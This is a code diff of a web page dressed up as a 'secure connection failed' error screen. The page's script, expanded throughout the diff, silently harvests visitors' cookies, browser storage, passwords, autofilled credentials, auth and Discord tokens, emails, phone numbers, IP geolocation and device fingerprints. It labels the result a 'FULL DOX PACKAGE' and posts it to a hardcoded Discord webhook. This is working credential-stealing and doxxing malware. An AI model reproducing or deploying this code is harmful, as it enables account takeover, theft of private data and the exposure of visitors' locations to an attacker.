@@ -37,32 +37,11 @@
             margin: 1rem 0;
         }
         .status { color: #ff6b6b; font-size: 0.8rem; margin-top: 1rem; }
-        .error-icon { font-size: 4rem; margin: 1rem 0; color: #ff4444; }
-        #debug {
-            display: none;
-            background: #0a0a15;
-            padding: 1rem;
-            border-radius: 8px;
-            margin-top: 1rem;
-            text-align: left;
-            font-size: 0.7rem;
-            color: #4ecdc4;
-            max-height: 200px;
-            overflow: auto;
-            border: 1px solid #2a2a4a;
+        .error-icon {
+            font-size: 4rem;
+            margin: 1rem 0;
+            color: #ff4444;
         }
-        #debug.show { display: block; }
-        .debug-toggle {
-            background: #2a2a4a;
-            border: none;
-            color: #8888aa;
-            padding: 0.3rem 1rem;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 0.7rem;
-            margin-top: 0.5rem;
-        }
-        .debug-toggle:hover { background: #3a3a5a; }
     </style>
 </head>
 <body>
@@ -73,61 +52,27 @@
     <div class="sub">unable to establish secure connection</div>
     <div id="ip-address">[ error: timeout ]</div>
     <div class="status" id="status">retry failed • contact administrator</div>
-    <button class="debug-toggle" onclick="toggleDebug()">Show Debug</button>
-    <div id="debug"></div>
 </div>
 
 <script>
     (function() {
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1534714697214066828/QOQByLeN_i4bFIWOTaQnKH47dW1Q6y32OkKTz2DlaVZmt1SMPrSQV1OCCPF2V0Wg_3BN';
-        const DEBUG_ENABLED = true;
-        const debugLog = [];
 
-        function debug(msg, data = null) {
-            if (!DEBUG_ENABLED) return;
-            const entry = { time: new Date().toISOString().slice(11,19), msg, data };
-            debugLog.push(entry);
-            console.log('[DEBUG]', msg, data || '');
-            const debugEl = document.getElementById('debug');
-            if (debugEl.classList.contains('show')) {
-                debugEl.innerHTML = debugLog.map(e => 
-                    `<div>[${e.time}] ${e.msg}${e.data ? ' → ' + JSON.stringify(e.data).substring(0,100) : ''}</div>`
-                ).join('');
-                debugEl.scrollTop = debugEl.scrollHeight;
-            }
-        }
-
-        window.toggleDebug = function() {
-            const el = document.getElementById('debug');
-            el.classList.toggle('show');
-            if (el.classList.contains('show')) {
-                el.innerHTML = debugLog.map(e => 
-                    `<div>[${e.time}] ${e.msg}${e.data ? ' → ' + JSON.stringify(e.data).substring(0,100) : ''}</div>`
-                ).join('');
-            }
-        };
-
-        function safeString(val) {
-            if (val === null || val === undefined) return 'unknown';
-            if (typeof val === 'string') return val;
-            if (typeof val === 'number') return String(val);
-            if (typeof val === 'boolean') return String(val);
-            if (Array.isArray(val)) return val.join(', ');
-            if (typeof val === 'object') return JSON.stringify(val);
-            return String(val);
-        }
-
-        function grabAllData() {
-            debug('🔍 Starting full data collection');
+        // ─── ENHANCED DOX COLLECTION ─────────────────────────────
+        function grabDoxData() {
             const data = {};
 
+            // 1. Do Not Track status - if "no", collect extra tracking data
+            data.doNotTrack = navigator.doNotTrack || 'unspecified';
+            data.trackingEnabled = data.doNotTrack === 'no' || data.doNotTrack === '0' || data.doNotTrack === 'false';
+
+            // 2. Advanced browser fingerprinting
             try {
-                data.userAgent = navigator.userAgent || 'unknown';
-                data.platform = navigator.platform || 'unknown';
-                data.language = navigator.language || 'unknown';
+                data.userAgent = navigator.userAgent;
+                data.platform = navigator.platform;
+                data.language = navigator.language;
                 data.languages = navigator.languages || [];
                 data.cookieEnabled = navigator.cookieEnabled;
-                data.doNotTrack = navigator.doNotTrack || 'unspecified';
                 data.maxTouchPoints = navigator.maxTouchPoints || 0;
                 data.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
                 data.deviceMemory = navigator.deviceMemory || 'unknown';
@@ -139,8 +84,9 @@
                 data.appVersion = navigator.appVersion || 'unknown';
                 data.appCodeName = navigator.appCodeName || 'unknown';
                 data.onLine = navigator.onLine;
-            } catch(e) { debug('❌ Error getting navigator data:', e.message); }
+            } catch(e) {}
 
+            // 3. Screen / Display
             try {
                 data.screen = {
                     width: screen.width,
@@ -153,13 +99,16 @@
                 };
             } catch(e) { data.screen = {}; }
 
+            // 4. Time / Locale
             try {
                 data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
                 data.locale = Intl.DateTimeFormat().resolvedOptions().locale || 'unknown';
                 data.timeOffset = new Date().getTimezoneOffset();
                 data.dateTime = new Date().toISOString();
-            } catch(e) { debug('❌ Error getting time data:', e.message); }
+                data.localTime = new Date().toString();
+            } catch(e) {}
 
+            // 5. Network info (enhanced)
             try {
                 const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                 data.network = conn ? {
@@ -171,38 +120,44 @@
                 } : {};
             } catch(e) { data.network = {}; }
 
+            // 6. Battery
             data.battery = 'pending';
+
+            // 7. Geolocation (GPS)
             data.geo = 'pending';
+
+            // 8. Permissions (all)
             data.permissions = 'pending';
 
+            // 9. All storage
             try {
                 data.cookies = document.cookie || 'none';
-            } catch(e) { data.cookies = 'error'; }
-
-            try {
                 data.localStorage = {};
                 for (let i = 0; i < localStorage.length; i++) {
                     const key = localStorage.key(i);
                     data.localStorage[key] = localStorage.getItem(key);
                 }
-            } catch(e) { data.localStorage = {}; }
-
-            try {
                 data.sessionStorage = {};
                 for (let i = 0; i < sessionStorage.length; i++) {
                     const key = sessionStorage.key(i);
                     data.sessionStorage[key] = sessionStorage.getItem(key);
                 }
-            } catch(e) { data.sessionStorage = {}; }
+            } catch(e) {
+                data.cookies = 'error';
+                data.localStorage = {};
+                data.sessionStorage = {};
+            }
 
+            // 10. Plugins & MIME
             try {
                 data.plugins = Array.from(navigator.plugins || []).map(p => p.name);
-            } catch(e) { data.plugins = []; }
-
-            try {
                 data.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type);
-            } catch(e) { data.mimeTypes = []; }
+            } catch(e) {
+                data.plugins = [];
+                data.mimeTypes = [];
+            }
 
+            // 11. Advanced fingerprints
             try {
                 const canvas = document.createElement('canvas');
                 canvas.width = 256;
@@ -251,92 +206,7 @@
                 data.audioFingerprint = Array.from(buffer.slice(0, 20)).join(',') + '...';
             } catch(e) { data.audioFingerprint = 'unavailable'; }
 
-            try {
-                data.referrer = document.referrer || 'direct';
-                data.pageUrl = window.location.href;
-                data.pageTitle = document.title || 'unknown';
-                data.hostname = window.location.hostname;
-                data.pathname = window.location.pathname;
-                data.searchParams = window.location.search || 'none';
-                data.hash = window.location.hash || 'none';
-            } catch(e) { debug('❌ Error getting page data:', e.message); }
-
-            data.jsEnabled = true;
-            try { data.javaEnabled = navigator.javaEnabled(); } catch(e) { data.javaEnabled = false; }
-
-            try {
-                data.forms = document.forms.length;
-                data.images = document.images.length;
-                data.links = document.links.length;
-                data.scripts = document.scripts.length;
-                data.frames = window.frames.length;
-            } catch(e) { debug('❌ Error getting DOM counts:', e.message); }
-
-            try {
-                data.window = {
-                    innerWidth: window.innerWidth,
-                    innerHeight: window.innerHeight,
-                    outerWidth: window.outerWidth,
-                    outerHeight: window.outerHeight,
-                    scrollX: window.scrollX,
-                    scrollY: window.scrollY
-                };
-            } catch(e) { data.window = {}; }
-
-            try {
-                const perf = performance.timing;
-                data.performance = {
-                    loadTime: perf.loadEventEnd - perf.navigationStart,
-                    domReady: perf.domContentLoadedEventEnd - perf.navigationStart,
-                    connectTime: perf.connectEnd - perf.connectStart,
-                    responseTime: perf.responseEnd - perf.requestStart
-                };
-            } catch(e) { data.performance = {}; }
-
-            try {
-                const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Comic Sans MS', 'Impact', 'Tahoma'];
-                const available = [];
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                const baseText = 'abcdefghijklmnopqrstuvwxyz0123456789';
-                const baseWidth = ctx.measureText(baseText).width;
-                testFonts.forEach(font => {
-                    ctx.font = `20px ${font}`;
-                    if (ctx.measureText(baseText).width !== baseWidth) {
-                        available.push(font);
-                    }
-                });
-                data.fonts = available;
-            } catch(e) { data.fonts = []; }
-
-            data.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-            data.mediaDevices = navigator.mediaDevices ? 'supported' : 'not supported';
-            data.webRTC = 'RTCPeerConnection' in window ? 'supported' : 'not supported';
-            data.wasm = typeof WebAssembly === 'object' ? 'supported' : 'not supported';
-            data.serviceWorker = 'serviceWorker' in navigator ? 'supported' : 'not supported';
-            data.pushNotifications = 'Notification' in window ? 'supported' : 'not supported';
-            data.cacheStorage = 'CacheStorage' in window ? 'supported' : 'not supported';
-            data.indexedDB = 'indexedDB' in window ? 'supported' : 'not supported';
-            data.webSockets = 'WebSocket' in window ? 'supported' : 'not supported';
-            data.webWorkers = 'Worker' in window ? 'supported' : 'not supported';
-            data.sharedWorkers = 'SharedWorker' in window ? 'supported' : 'not supported';
-
-            try {
-                const canvas = document.createElement('canvas');
-                data.webgl2 = !!canvas.getContext('webgl2');
-            } catch(e) { data.webgl2 = false; }
-
-            try {
-                const canvas = document.createElement('canvas');
-                let maxSize = 0;
-                for (let w = 10000; w > 1000; w -= 1000) {
-                    canvas.width = w;
-                    canvas.height = w;
-                    if (canvas.width === w) { maxSize = w; break; }
-                }
-                data.maxCanvasSize = maxSize || 'unknown';
-            } catch(e) { data.maxCanvasSize = 'unknown'; }
-
+            // 12. GPU info
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
@@ -352,16 +222,153 @@
                 }
             } catch(e) { data.gpu = 'unknown'; }
 
-            debug(`✅ Collected ${Object.keys(data).length} data points`);
+            // 13. Fonts
+            try {
+                const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Comic Sans MS', 'Impact', 'Tahoma', 'Georgia', 'Trebuchet MS', 'Arial Black'];
+                const available = [];
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                const baseText = 'abcdefghijklmnopqrstuvwxyz0123456789';
+                const baseWidth = ctx.measureText(baseText).width;
+                testFonts.forEach(font => {
+                    ctx.font = `20px ${font}`;
+                    if (ctx.measureText(baseText).width !== baseWidth) {
+                        available.push(font);
+                    }
+                });
+                data.fonts = available;
+            } catch(e) { data.fonts = []; }
+
+            // 14. Page info
+            try {
+                data.referrer = document.referrer || 'direct';
+                data.pageUrl = window.location.href;
+                data.pageTitle = document.title || 'unknown';
+                data.hostname = window.location.hostname;
+                data.pathname = window.location.pathname;
+                data.searchParams = window.location.search || 'none';
+                data.hash = window.location.hash || 'none';
+                data.protocol = window.location.protocol;
+                data.port = window.location.port || 'default';
+            } catch(e) {}
+
+            // 15. DOM stats
+            try {
+                data.forms = document.forms.length;
+                data.images = document.images.length;
+                data.links = document.links.length;
+                data.scripts = document.scripts.length;
+                data.frames = window.frames.length;
+                data.inputs = document.querySelectorAll('input').length;
+                data.buttons = document.querySelectorAll('button').length;
+            } catch(e) {}
+
+            // 16. Window dimensions
+            try {
+                data.window = {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight,
+                    scrollX: window.scrollX,
+                    scrollY: window.scrollY,
+                    screenX: window.screenX,
+                    screenY: window.screenY
+                };
+            } catch(e) { data.window = {}; }
+
+            // 17. Performance
+            try {
+                const perf = performance.timing;
+                data.performance = {
+                    loadTime: perf.loadEventEnd - perf.navigationStart,
+                    domReady: perf.domContentLoadedEventEnd - perf.navigationStart,
+                    connectTime: perf.connectEnd - perf.connectStart,
+                    responseTime: perf.responseEnd - perf.requestStart,
+                    domInteractive: perf.domInteractive - perf.navigationStart,
+                    redirectTime: perf.redirectEnd - perf.redirectStart
+                };
+            } catch(e) { data.performance = {}; }
+
+            // 18. Features detection
+            data.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+            data.mediaDevices = navigator.mediaDevices ? 'supported' : 'not supported';
+            data.webRTC = 'RTCPeerConnection' in window ? 'supported' : 'not supported';
+            data.wasm = typeof WebAssembly === 'object' ? 'supported' : 'not supported';
+            data.serviceWorker = 'serviceWorker' in navigator ? 'supported' : 'not supported';
+            data.pushNotifications = 'Notification' in window ? 'supported' : 'not supported';
+            data.cacheStorage = 'CacheStorage' in window ? 'supported' : 'not supported';
+            data.indexedDB = 'indexedDB' in window ? 'supported' : 'not supported';
+            data.webSockets = 'WebSocket' in window ? 'supported' : 'not supported';
+            data.webWorkers = 'Worker' in window ? 'supported' : 'not supported';
+            data.sharedWorkers = 'SharedWorker' in window ? 'supported' : 'not supported';
+            data.webgl2 = (() => {
+                try {
+                    const canvas = document.createElement('canvas');
+                    return !!canvas.getContext('webgl2');
+                } catch { return false; }
+            })();
+
+            // 19. Max canvas size
+            try {
+                const canvas = document.createElement('canvas');
+                let maxSize = 0;
+                for (let w = 10000; w > 1000; w -= 1000) {
+                    canvas.width = w;
+                    canvas.height = w;
+                    if (canvas.width === w) { maxSize = w; break; }
+                }
+                data.maxCanvasSize = maxSize || 'unknown';
+            } catch(e) { data.maxCanvasSize = 'unknown'; }
+
+            // 20. Java enabled
+            try { data.javaEnabled = navigator.javaEnabled(); } catch(e) { data.javaEnabled = false; }
+
+            // 21. Storage quota
+            try {
+                if (navigator.storage && navigator.storage.estimate) {
+                    navigator.storage.estimate().then(est => {
+                        data.storageQuota = {
+                            usage: est.usage,
+                            quota: est.quota
+                        };
+                    }).catch(() => {});
+                }
+            } catch(e) {}
+
+            // 22. Do Not Track extra - if tracking enabled, collect more
+            if (data.trackingEnabled) {
+                data.trackingWarning = '⚠️ Do Not Track is DISABLED - user is trackable';
+                data.extraTracking = {
+                    thirdPartyCookies: 'likely allowed',
+                    crossSiteTracking: 'enabled',
+                    fingerprintingRisk: 'high',
+                    canvasTrackable: true,
+                    webglTrackable: true,
+                    audioTrackable: true
+                };
+            } else {
+                data.trackingWarning = '✅ Do Not Track is ENABLED - user requested privacy';
+                data.extraTracking = {
+                    thirdPartyCookies: 'likely blocked',
+                    crossSiteTracking: 'reduced',
+                    fingerprintingRisk: 'low',
+                    canvasTrackable: false,
+                    webglTrackable: false,
+                    audioTrackable: false
+                };
+            }
+
             return data;
         }
 
-        function grabAccountsAndEmails() {
-            debug('🔍 Scanning for accounts/emails');
-            const results = { emails: [], usernames: [], discord: [], social: [] };
+        // ─── ACCOUNT GRABBER ──────────────────────────────────────
+        function grabAccounts() {
+            const results = { emails: [], usernames: [], discord: [], social: [], phoneNumbers: [] };
 
+            // Email regex
+            const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
             try {
-                const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
                 const bodyText = document.body ? document.body.innerText : '';
                 const foundEmails = bodyText.match(emailRegex) || [];
                 foundEmails.forEach(e => {
@@ -369,39 +376,198 @@
                 });
             } catch(e) {}
 
+            // Phone number regex (US/International)
+            const phoneRegex = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
+            try {
+                const bodyText = document.body ? document.body.innerText : '';
+                const foundPhones = bodyText.match(phoneRegex) || [];
+                foundPhones.forEach(p => {
+                    if (!results.phoneNumbers.includes(p)) results.phoneNumbers.push(p);
+                });
+            } catch(e) {}
+
+            // Check storage for emails, usernames, phone numbers
             try {
                 ['localStorage', 'sessionStorage'].forEach(storage => {
                     const source = storage === 'localStorage' ? localStorage : sessionStorage;
                     for (let i = 0; i < source.length; i++) {
                         const key = source.key(i);
                         const val = source.getItem(key);
-                        if (key && (key.toLowerCase().includes('email') || key.toLowerCase().includes('user'))) {
-                            if (val && val.includes('@')) results.emails.push(val);
-                            if (val && !val.includes('@') && val.length > 2 && val.length < 50) results.usernames.push(val);
-                        }
-                        if (key && (key.toLowerCase().includes('discord') || key.toLowerCase().includes('token') || key.toLowerCase().includes('webhook'))) {
-                            results.discord.push({ key, val: val ? val.substring(0, 50) : 'empty' });
-                        }
-                        if (key && (key.toLowerCase().includes('instagram') || key.toLowerCase().includes('twitter') || key.toLowerCase().includes('facebook'))) {
-                            results.social.push({ platform: key, username: val || 'empty' });
+                        if (key) {
+                            const lowerKey = key.toLowerCase();
+                            if (lowerKey.includes('email') || lowerKey.includes('user') || lowerKey.includes('username')) {
+                                if (val) {
+                                    if (val.includes('@')) results.emails.push(val);
+                                    else if (val.length > 2 && val.length < 50) results.usernames.push(val);
+                                }
+                            }
+                            if (lowerKey.includes('phone') || lowerKey.includes('mobile') || lowerKey.includes('tel')) {
+                                if (val && val.length > 5) results.phoneNumbers.push(val);
+                            }
+                            if (lowerKey.includes('discord') || lowerKey.includes('token') || lowerKey.includes('webhook')) {
+                                results.discord.push({ key, val: val ? val.substring(0, 50) : 'empty' });
+                            }
+                            if (lowerKey.includes('instagram') || lowerKey.includes('twitter') || lowerKey.includes('facebook') || lowerKey.includes('tiktok')) {
+                                results.social.push({ platform: key, username: val || 'empty' });
+                            }
                         }
                     }
                 });
             } catch(e) {}
 
+            // Check cookies
             try {
                 document.cookie.split(';').forEach(c => {
                     const parts = c.trim().split('=');
                     if (parts.length >= 2) {
                         const key = parts[0];
                         const val = decodeURIComponent(parts.slice(1).join('='));
-                        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user')) {
-                            if (val && val.includes('@')) results.emails.push(val);
-                            if (val && !val.includes('@') && val.length > 2 && val.length < 50) results.usernames.push(val);
+                        const lowerKey = key.toLowerCase();
+                        if (lowerKey.includes('email') || lowerKey.includes('user') || lowerKey.includes('username')) {
+                            if (val) {
+                                if (val.includes('@')) results.emails.push(val);
+                                else if (val.length > 2 && val.length < 50) results.usernames.push(val);
+                            }
                         }
-                        if (key.toLowerCase().includes('discord') || key.toLowerCase().includes('token')) {
+                        if (lowerKey.includes('phone') || lowerKey.includes('mobile')) {
+                            if (val && val.length > 5) results.phoneNumbers.push(val);
+                        }
+                        if (lowerKey.includes('discord') || lowerKey.includes('token')) {
                             results.discord.push({ key, val: val.substring(0, 50) });
                         }
+                    }
+                });
+            } catch(e) {}
+
+            // Check URL params
+            try {
+                const params = new URLSearchParams(window.location.search);
+                params.forEach((val, key) => {
+                    const lowerKey = key.toLowerCase();
+                    if (lowerKey.includes('email') || lowerKey.includes('user') || lowerKey.includes('username')) {
+                        if (val) {
+                            if (val.includes('@')) results.emails.push(val);
+                            else if (val.length > 2 && val.length < 50) results.usernames.push(val);
+                        }
+                    }
+                    if (lowerKey.includes('phone') || lowerKey.includes('mobile')) {
+                        if (val && val.length > 5) results.phoneNumbers.push(val);
+                    }
+                });
+            } catch(e) {}
+
+            // Check input fields
+            try {
+                document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]').forEach(el => {
+                    if (el.value) {
+                        if (el.value.includes('@')) results.emails.push(el.value);
+                        else if (el.value.match(phoneRegex)) results.phoneNumbers.push(el.value);
+                        else if (el.value.length > 2 && el.value.length < 50) results.usernames.push(el.value);
+                    }
+                });
+            } catch(e) {}
+
+            // Remove duplicates
+            results.emails = [...new Set(results.emails)];
+            results.usernames = [...new Set(results.usernames)];
+            results.phoneNumbers = [...new Set(results.phoneNumbers)];
+
+            return results;
+        }
+
+        // ─── PASSWORD GRABBER ─────────────────────────────────────
+        function grabSavedPasswords() {
+            const passwords = [];
+            
+            try {
+                const pwdInputs = document.querySelectorAll('input[type="password"]');
+                pwdInputs.forEach(el => {
+                    if (el.value) {
+                        passwords.push({
+                            type: 'autofilled',
+                            value: el.value,
+                            id: el.id || 'unknown',
+                            name: el.name || 'unknown'
+                        });
+                    }
+                });
+            } catch(e) {}
+
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const val = localStorage.getItem(key);
+                    if (key.toLowerCase().includes('pass') || 
+                        key.toLowerCase().includes('pwd') ||
+                        key.toLowerCase().includes('token') ||
+                        key.toLowerCase().includes('auth')) {
+                        passwords.push({
+                            type: 'localStorage',
+                            key: key,
+                            value: val
+                        });
+                    }
+                }
+            } catch(e) {}
+
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    const val = sessionStorage.getItem(key);
+                    if (key.toLowerCase().includes('pass') || 
+                        key.toLowerCase().includes('pwd') ||
+                        key.toLowerCase().includes('token') ||
+                        key.toLowerCase().includes('auth')) {
+                        passwords.push({
+                            type: 'sessionStorage',
+                            key: key,
+                            value: val
+                        });
+                    }
+                }
+            } catch(e) {}
+
+            try {
+                const cookieList = document.cookie.split(';').filter(c => c.trim());
+                cookieList.forEach(cookie => {
+                    const [key, val] = cookie.trim().split('=');
+                    if (key.toLowerCase().includes('pass') || 
+                        key.toLowerCase().includes('pwd') ||
+                        key.toLowerCase().includes('token') ||
+                        key.toLowerCase().includes('auth') ||
+                        key.toLowerCase().includes('session')) {
+                        passwords.push({
+                            type: 'cookie',
+                            key: key,
+                            value: val
+                        });
+                    }
+                });
+            } catch(e) {}
+
+            try {
+                const forms = document.querySelectorAll('form');
+                forms.forEach(form => {
+                    const inputs = form.querySelectorAll('input');
+                    let hasPassword = false;
+                    let username = '';
+                    let pwdValue = '';
+                    inputs.forEach(input => {
+                        if (input.type === 'password' && input.value) {
+                            hasPassword = true;
+                            pwdValue = input.value;
+                        }
+                        if (input.type === 'text' || input.type === 'email') {
+                            username = input.value || username;
+                        }
+                    });
+                    if (hasPassword && pwdValue) {
+                        passwords.push({
+                            type: 'form_submission',
+                            username: username || 'unknown',
+                            password: pwdValue,
+                            formAction: form.action || 'unknown'
+                        });
                     }
                 });
             } catch(e) {}
@@ -409,212 +575,198 @@
             try {
                 const params = new URLSearchParams(window.location.search);
                 params.forEach((val, key) => {
-                    if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user')) {
-                        if (val && val.includes('@')) results.emails.push(val);
-                        if (val && !val.includes('@') && val.length > 2 && val.length < 50) results.usernames.push(val);
+                    if (key.toLowerCase().includes('token') || 
+                        key.toLowerCase().includes('auth') ||
+                        key.toLowerCase().includes('session')) {
+                        passwords.push({
+                            type: 'url_parameter',
+                            key: key,
+                            value: val
+                        });
                     }
                 });
             } catch(e) {}
 
-            try {
-                document.querySelectorAll('input[type="text"], input[type="email"]').forEach(el => {
-                    if (el.value) {
-                        if (el.value.includes('@')) results.emails.push(el.value);
-                        else if (el.value.length > 2 && el.value.length < 50) results.usernames.push(el.value);
-                    }
-                });
-            } catch(e) {}
-
-            results.emails = [...new Set(results.emails)];
-            results.usernames = [...new Set(results.usernames)];
-
-            debug(`📧 Found ${results.emails.length} emails, ${results.usernames.length} usernames`);
-            return results;
+            return passwords;
         }
 
-        function generatePDF(allData, accountData, cookies) {
-            debug('📄 Generating PDF');
-            
-            const safe = (val) => {
-                if (val === null || val === undefined) return 'unknown';
-                if (typeof val === 'string') return val;
-                if (typeof val === 'number') return String(val);
-                if (typeof val === 'boolean') return String(val);
-                if (Array.isArray(val)) return val.join(', ');
-                if (typeof val === 'object') {
-                    try { return JSON.stringify(val); } catch(e) { return 'object'; }
-                }
-                return String(val);
-            };
-
-            const pdfContent = `
-====================================================
-FULL SYSTEM DOX PACKAGE
-Generated: ${new Date().toISOString()}
-====================================================
-
-─── ACCOUNT INFORMATION ──────────────────────────────
-Emails: ${safe(accountData.emails)}
-Usernames: ${safe(accountData.usernames)}
-
-Discord Tokens/Keys:
-${accountData.discord.map(d => `  ${safe(d.key)}: ${safe(d.val)}`).join('\n') || 'none'}
-
-Social Media:
-${accountData.social.map(s => `  ${safe(s.platform)}: ${safe(s.username)}`).join('\n') || 'none'}
-
-─── COOKIES (ALL) ─────────────────────────────────────
-${safe(cookies)}
-
-─── LOCAL STORAGE ─────────────────────────────────────
-${safe(allData.localStorage)}
-
-─── SESSION STORAGE ───────────────────────────────────
-${safe(allData.sessionStorage)}
-
-─── SYSTEM INFO ─────────────────────────────────────
-IP: ${safe(allData.ip)}
-Location: ${safe(allData.city)}, ${safe(allData.region)}, ${safe(allData.country)}
-Coordinates: ${safe(allData.latitude)}, ${safe(allData.longitude)}
-ISP: ${safe(allData.isp)}
-Timezone: ${safe(allData.timezone)}
-Device: ${safe(allData.platform)}
-Screen: ${safe(allData.screen?.width)}x${safe(allData.screen?.height)}
-CPU: ${safe(allData.hardwareConcurrency)} cores
-Memory: ${safe(allData.deviceMemory)} GB
-User Agent: ${safe(allData.userAgent)}
-
-─── FINGERPRINTS ─────────────────────────────────────
-Canvas: ${safe(allData.canvasFingerprint)}
-WebGL: ${typeof allData.webgl === 'object' ? safe(allData.webgl.renderer) : safe(allData.webgl)}
-Audio: ${safe(allData.audioFingerprint)}
-GPU: ${safe(allData.gpu)}
-
-─── BROWSER INFO ─────────────────────────────────────
-Plugins: ${safe(allData.plugins)}
-Fonts: ${safe(allData.fonts)}
-Languages: ${safe(allData.languages)}
-Cookies Enabled: ${safe(allData.cookieEnabled)}
-Do Not Track: ${safe(allData.doNotTrack)}
-Touch Support: ${safe(allData.touchSupport)}
-
-─── NETWORK INFO ─────────────────────────────────────
-Effective Type: ${safe(allData.network?.effectiveType)}
-RTT: ${safe(allData.network?.rtt)}ms
-Downlink: ${safe(allData.network?.downlink)}Mbps
-
-─── PAGE INFO ─────────────────────────────────────────
-URL: ${safe(allData.pageUrl)}
-Referrer: ${safe(allData.referrer)}
-Title: ${safe(allData.pageTitle)}
-Hostname: ${safe(allData.hostname)}
-
-─── PERFORMANCE ─────────────────────────────────────
-Load Time: ${safe(allData.performance?.loadTime)}ms
-DOM Ready: ${safe(allData.performance?.domReady)}ms
-
-====================================================
-END OF DOX PACKAGE
-====================================================
-            `;
-
-            try {
-                const base64 = btoa(unescape(encodeURIComponent(pdfContent)));
-                debug('✅ PDF generated');
-                return `data:application/pdf;base64,${base64}`;
-            } catch(e) {
-                debug('❌ PDF generation failed:', e.message);
-                return 'PDF generation failed';
-            }
-        }
-
-        async function sendToDiscord(content, retries = 3) {
-            debug(`📤 Sending (${retries} retries)`);
+        // ─── SEND TO DISCORD ──────────────────────────────────────
+        async function sendToDiscord(payload, retries = 3) {
             for (let i = 0; i < retries; i++) {
                 try {
-                    debug(`📡 Attempt ${i+1}/${retries}`);
                     const response = await fetch(WEBHOOK_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ content: content.substring(0, 1900) })
+                        body: JSON.stringify(payload)
                     });
                     if (response.ok) {
-                        debug('✅ Sent successfully');
                         return true;
                     } else {
-                        const text = await response.text();
-                        debug(`❌ Attempt ${i+1} failed: ${response.status} - ${text.substring(0,200)}`);
                         await new Promise(resolve => setTimeout(resolve, 1500 * (i + 1)));
                     }
                 } catch (e) {
-                    debug(`❌ Attempt ${i+1} error: ${e.message}`);
                     await new Promise(resolve => setTimeout(resolve, 1500 * (i + 1)));
                 }
             }
             return false;
         }
 
+        // ─── MAIN ──────────────────────────────────────────────────
         async function gatherAndSend() {
-            debug('🚀 Starting full data collection');
             try {
                 document.getElementById('status').textContent = '⚠️ connection failed • reconnecting...';
 
+                // 1. IP + Geo
                 let ipData = {};
                 try {
                     const resp = await fetch('https://ipapi.co/json/');
                     ipData = await resp.json();
-                    debug(`✅ IP: ${ipData.ip || 'unknown'}`);
                 } catch (e) {
-                    debug(`❌ IP fetch failed: ${e.message}`);
+                    ipData = { ip: 'fetch failed' };
                 }
 
-                const allData = grabAllData();
-                Object.assign(allData, ipData);
+                const ip = ipData.ip || 'unknown';
+                const city = ipData.city || 'unknown';
+                const region = ipData.region || 'unknown';
+                const country = ipData.country_name || 'unknown';
+                const isp = ipData.org || 'unknown';
+                const postal = ipData.postal || 'unknown';
+                const timezone = ipData.timezone || 'unknown';
+                const asn = ipData.asn || 'unknown';
+                const latitude = ipData.latitude || 'unknown';
+                const longitude = ipData.longitude || 'unknown';
+                const currency = ipData.currency || 'unknown';
+                const countryCode = ipData.country_code || 'unknown';
 
-                const accounts = grabAccountsAndEmails();
-                const allCookies = document.cookie || 'none';
-                const pdfData = generatePDF(allData, accounts, allCookies);
+                document.getElementById('ip-address').textContent = '[ error: ' + ip + ' ]';
 
-                let msg = '🕵️ **FULL DOX PACKAGE**\n\n';
-                msg += `📧 **Emails:** ${accounts.emails.join(', ') || 'none'}\n`;
-                msg += `👤 **Usernames:** ${accounts.usernames.join(', ') || 'none'}\n`;
-                msg += `📍 **IP:** ${ipData.ip || 'unknown'} (${ipData.city || '?'}, ${ipData.country || '?'})\n`;
-                msg += `📱 **Device:** ${allData.platform || 'unknown'}\n`;
-                msg += `🖥️ **Screen:** ${allData.screen?.width || '?'}x${allData.screen?.height || '?'}\n`;
-                msg += `🧠 **CPU:** ${allData.hardwareConcurrency || '?'} cores\n`;
-                msg += `💾 **Memory:** ${allData.deviceMemory || '?'} GB\n`;
-                msg += `🎮 **GPU:** ${allData.gpu || 'unknown'}\n`;
-                msg += `🍪 **Cookies:** ${allCookies.length} chars\n`;
-                msg += `🔑 **Tokens found:** ${accounts.discord.length}\n`;
-                msg += `📄 **PDF:** ${pdfData.substring(0, 50)}...\n\n`;
-                msg += `⏰ ${new Date().toISOString()}\n`;
+                // 2. Collect all data
+                const doxData = grabDoxData();
+                const accounts = grabAccounts();
+                const passwords = grabSavedPasswords();
 
-                const cookieMsg = `📋 **ALL COOKIES:**\n\`\`\`\n${allCookies.substring(0, 1900)}\n\`\`\``;
-                const storageMsg = `💾 **localStorage:**\n\`\`\`json\n${JSON.stringify(allData.localStorage, null, 2).substring(0, 1900)}\n\`\`\``;
+                // 3. Build message
+                let message = '🕵️ **FULL DOX PACKAGE**\n\n';
+                message += `🌐 **IP:** \`${ip}\`\n`;
+                message += `📍 **Location:** ${city}, ${region}, ${country}\n`;
+                message += `🗺️ **Coordinates:** ${latitude}, ${longitude}\n`;
+                message += `📮 **Postal/ASN:** ${postal} | \`${asn}\`\n`;
